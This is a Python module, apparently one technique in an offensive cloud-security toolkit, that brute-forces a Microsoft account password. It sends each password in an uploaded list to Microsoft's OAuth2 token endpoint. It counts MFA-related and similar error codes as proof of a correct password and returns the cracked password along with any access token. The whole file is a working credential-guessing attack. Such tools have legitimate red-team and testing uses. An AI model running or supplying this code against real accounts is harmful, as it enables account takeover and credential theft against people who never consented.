import requests
import base64
import time

def TechniqueMain(user_name, wait = None, client_id = None, password_file_content = None):
    '''Generates graph access token by authenticating with a username & password'''

    # username input validation
    if user_name == [None,""]:
        return {"Error" : "Username input required"}

    # passwords file input validation
    if password_file_content == [None,""]:
        return {"Error" : "Passwords file required"}

    # client id input validation
    if client_id in [None, ""]:
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #Setting the default client to use if user does not specify

    # wait time input validation
    if wait in [None,""]:
        wait = 5 #set default to 5 seconds

    endpoint_url = "https://login.microsoft.com/common/oauth2/token"
    resource = "https://graph.microsoft.com"
    scope = ['openid']
    
    headers = {
        "Accept" : "application/json",
        "Content-Type" : "application/x-www-form-urlencoded"
    }

    # extract passwords from text file
    content_string = password_file_content[0].split(',')[-1]
    decoded = base64.b64decode(content_string)
    try:
        text = decoded.decode('utf-8')
        passwords_list = text.split('\n')
    except:
        return {"Error" : "Failed to read password file"}

    # start bruteforce
    for password in passwords_list:
        data = {
            "grant_type": "password",
            "password" : password,
            "client_id" : client_id,
            "username" : user_name,
            "resource" : resource,
            "scope" : ' '.join(scope)
        }

        '''Request access token'''
        try:
            raw_response = requests.post(url = endpoint_url, headers = headers, data = data).json()
            
            #Checking for failed authentication
            if 'error_codes' in raw_response:
                # check for error codes that indicate correct password but auth failed due to other reasons
                if any(e_code in [50076,50072, 50074, 50005, 50131] for e_code in raw_response['error_codes']):
                    return {"Password" : password, "Access_Token" : None, "Additional_Info" : {"Result" : "Password found", "Error code" : raw_response['error_codes'], "Error":raw_response['error'], "Error_Description" : raw_response['error_description']}}
                else:
                    raise Exception("Invalid Password")

            access_token = raw_response['access_token']
            return {"Password" : password, "Access_Token": access_token}

        except Exception as e:
            time.sleep(wait)
    
    return {"Error" : "Bruteforce unsuccessful. No password match"}


def TechniqueInputSrc():
    '''Returns the input fields required as parameters for the technique execution'''

    return [
        {"title" : "Username", "id" : "bf-text-input-username", "type" : "text", "placeholder" : "user@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Wait (Seconds)", "id" : "bf-wait-input", "type" : "number", "placeholder" : "5", "element_type" : "dcc.Input"},
        {"title" : "App ID (Optional)", "id" : "bf-client-id-text-input", "type" : "text", "placeholder" : "Optional (Default: Microsoft Office)", "element_type" : "dcc.Input"},
        {"title" : "Password File", "id" : "bf-password-file-uploader", "type" : "password", "placeholder" : "you got this right?", "element_type" : "dcc.Upload"}
    ]

def TechniqueOutput(raw_response):
    '''Returns a structured response'''
    # initialize pretty response
    pretty_response = raw_response
    return pretty_response